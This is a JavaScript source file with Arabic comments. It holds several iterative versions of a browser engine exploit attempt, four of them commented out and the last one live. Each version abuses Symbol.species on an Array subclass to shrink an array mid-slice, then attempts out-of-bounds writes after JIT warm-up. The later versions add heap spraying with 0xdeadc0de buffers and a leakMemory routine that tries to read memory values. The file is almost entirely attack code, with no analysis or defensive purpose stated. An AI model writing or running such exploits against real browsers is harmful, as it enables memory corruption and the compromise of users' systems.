/* v1
let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x1000); // حاوية أكبر
let y = new Uint32Array(ab); // لتخزين القيمة المسروقة

function Target(Special, Idx, Value) {
    // تعبئة الذاكرة بقيمة معروفة
    Arr.fill(0x41414141);
    Special.slice(); // استهداف الكائن
    Arr[Idx] = Value; // كتابة القيمة في الفهرس
    y[0] = Arr[Idx]; // محاولة قراءة القيمة
    if (Idx === 0x20 && Trigger) {
        // يمكن إضافة تحقق هنا لاحقًا
    }
    //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0; // تحرير الطول
                let spray = new Array(0x1000).fill(new ArrayBuffer(0x100)); // heap spraying
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x21); // مصفوفة أصغر لتسهيل OOB
    Arr.fill(0);
    // تكرار لزيادة فرصة OOB
    for (let Idx = 0; Idx < 0x800; Idx++) {
        Target(Snowflake, Idx, 0xdeadbeef);
    }
    Trigger = true;
    Target(Snowflake, 0x20, 0xdeadc0de); // قيمة مختلفة للتحقق
    alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
    alert(`y[0] = ${y[0].toString(16)}`);
    alert(`Arr.length = ${Arr.length}`);
}

main();
*/

/* v2
let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x2000); // زيادة الحجم لتخزين 64-bit
let y = new BigUint64Array(ab); // استخدام BigUint64Array لدعم 64-bit

function Target(Special, Idx, Value) {
    Arr.fill(4e-324); // تهيئة بقيمة صغيرة كما في المثال
    Special.slice();
    Arr[Idx] = Value; // كتابة القيمة 64-bit
    y[0] = BigInt(Arr[Idx]); // تحويل إلى 64-bit
    if (Idx === 0x20 && Trigger) {
        //alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
    }
    //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0;
               // gc(); // تحرير الذاكرة
                let spray = new Array(0x1000).fill(new ArrayBuffer(0x100).fill(0xdeadc0de)); // heap spraying
                alert("Heap sprayed with 0xdeadc0de");
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x21);
    Arr.fill(0);
    for (let Idx = 0; Idx < 0x400; Idx++) { // تكرار كما في المثال
        Target(Snowflake, 0, 5e-324);
    }
    Trigger = true;
    let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit باستخدام BigInt
    Target(Snowflake, 0x20, qwordValue);
    alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
    alert(`y[0] = ${y[0].toString(16)}`);
    alert(`Arr.length = ${Arr.length}`);
}

main();
*/

/* v3
let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x2000); // زيادة الحجم
let y = new BigUint64Array(ab); // دعم 64-bit

function Target(Special, Idx, Value) {
    try {
        Arr.fill(4e-324); // تهيئة
        Special.slice();
        Arr[Idx] = Value; // كتابة القيمة
        y[0] = BigInt(Arr[Idx]); // قراءة إلى 64-bit
        if (Idx === 0x20 && Trigger) {
           // alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
        }
        //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
    } catch (e) {
        alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
    }
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0;
                let spray = new Array(0x1000).fill(new ArrayBuffer(0x100).fill(0xdeadc0de)); // heap spraying
                alert("Heap sprayed with 0xdeadc0de");
            }
        };
    }
};

function main() {
    try {
        const Snowflake = new SoSpecial();
        Arr = new Array(0x21);
        Arr.fill(0);
        for (let Idx = 0; Idx < 0x400; Idx++) {
            Target(Snowflake, 0, 5e-324);
        }
        Trigger = true;
        let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
        Target(Snowflake, 0x20, qwordValue);
        alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
        alert(`y[0] = ${y[0].toString(16)}`);
        alert(`Arr.length = ${Arr.length}`);
    } catch (e) {
        alert(`Main Error: ${e.message}`);
    }
}

main();
*/

/* v4
let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x2000); // زيادة الحجم
let y = new BigUint64Array(ab); // دعم 64-bit

function Target(Special, Idx, Value) {
    try {
        Arr.fill(4e-324); // تهيئة
        Special.slice();
        Arr[Idx] = Value; // كتابة القيمة
        y[0] = BigInt(Arr[Idx]); // قراءة إلى 64-bit
        if (Idx === 0x20 && Trigger) {
            //alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
        }
        //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
    } catch (e) {
        alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
    }
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0;
                // تصحيح heap spraying
                let sprayAb = new ArrayBuffer(0x100);
                let sprayView = new Uint32Array(sprayAb);
                sprayView.fill(0xdeadc0de); // تعبئة باستخدام Uint32Array
                let spray = new Array(0x1000).fill(sprayAb); // تكرار
                alert("Heap sprayed with 0xdeadc0de");
            }
        };
    }
};

function main() {
    try {
        const Snowflake = new SoSpecial();
        Arr = new Array(0x21);
        Arr.fill(0);
        for (let Idx = 0; Idx < 0x400; Idx++) {
            Target(Snowflake, 0, 5e-324);
        }
        Trigger = true;
        let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
        Target(Snowflake, 0x20, qwordValue);
        alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
        alert(`y[0] = ${y[0].toString(16)}`);
        alert(`Arr.length = ${Arr.length}`);
    } catch (e) {
        alert(`Main Error: ${e.message}`);
    }
}

main();
*/


let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x2000); // زيادة الحجم
let y = new BigUint64Array(ab); // دعم 64-bit

function Target(Special, Idx, Value) {
    try {
        Arr.fill(4e-324); // تهيئة
        Special.slice();
        Arr[Idx] = Value; // كتابة القيمة
        y[0] = BigInt(Arr[Idx]); // قراءة إلى 64-bit
        if (Idx === 0x20 && Trigger) {
            alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
        }
        alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
    } catch (e) {
        alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
    }
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0;
                let sprayAb = new ArrayBuffer(0x100);
                let sprayView = new Uint32Array(sprayAb);
                sprayView.fill(0xdeadc0de); // تعبئة باستخدام Uint32Array
                let spray = new Array(0x1000).fill(sprayAb); // تكرار
                alert("Heap sprayed with 0xdeadc0de");
            }
        };
    }
};

function leakMemory(Idx) {
    try {
        Arr[Idx] = 0x123456789abcdef0n; // قيمة اختبار 64-bit
        y[0] = BigInt(Arr[Idx]);
        alert(`Leaked at ${Idx.toString(16)}: ${y[0].toString(16)}`);
        return y[0];
    } catch (e) {
        alert(`Leak Error at ${Idx.toString(16)}: ${e.message}`);
        return 0n;
    }
}

function main() {
    try {
        const Snowflake = new SoSpecial();
        Arr = new Array(0x21);
        Arr.fill(0);
        for (let Idx = 0; Idx < 0x400; Idx++) {
            Target(Snowflake, 0, 5e-324);
        }
        Trigger = true;
        let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
        Target(Snowflake, 0x20, qwordValue);
        for (let Idx = 0x20; Idx < 0x30; Idx++) { // محاولة تسريب قيم
            leakMemory(Idx);
        }
        alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
        alert(`y[0] = ${y[0].toString(16)}`);
        alert(`Arr.length = ${Arr.length}`);
    } catch (e) {
        alert(`Main Error: ${e.message}`);
    }
}

main();